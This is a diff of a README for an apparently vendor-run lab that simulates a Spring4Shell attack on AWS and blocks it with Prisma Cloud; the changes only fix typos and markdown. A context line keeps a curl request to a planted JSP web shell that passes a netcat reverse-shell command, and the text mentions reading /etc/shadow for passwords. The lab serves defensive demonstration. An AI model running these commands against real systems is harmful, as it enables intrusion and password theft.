@@ -1,6 +1,6 @@
 # Lab for simulating Spring4Shell Attack on AWS and Protecting with Prisma Cloud
 
-These set of instructions are written to incorporate several compnonents.  Namely:
+These set of instructions are written to incorporate several components.  Namely:
 - Discuss how we offer Agentless and the Pros & Cons of Agentless only
 - The recent Critical Vulnerabilities such as Log4Shell & Spring4Shell and noting there are always yet to be discovered ones
 - Why any public facing workloads need Agents & Deploying a Container Defender
@@ -116,7 +116,7 @@ curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2
     - Re-run attack and should receive errors now and unable to gain passwords from the `cat /etc/shadow` command that runs in the script
     - Show in Primsa Cloud the event was Blocked/Prevented
 4. Prevent Container with Critical Vulnerabilities from even running
-    - Navigate to **Compute > Defend > Vulnerabilities > Images > Deployed
+    - Navigate to **Compute > Defend > Vulnerabilities > Images > Deployed**
     - In the spring4shell-ubuntu terminal, kill the current container
         - Get the container ID of **vuln_app_app** `docker ps`
         - `docker kill <ID>`
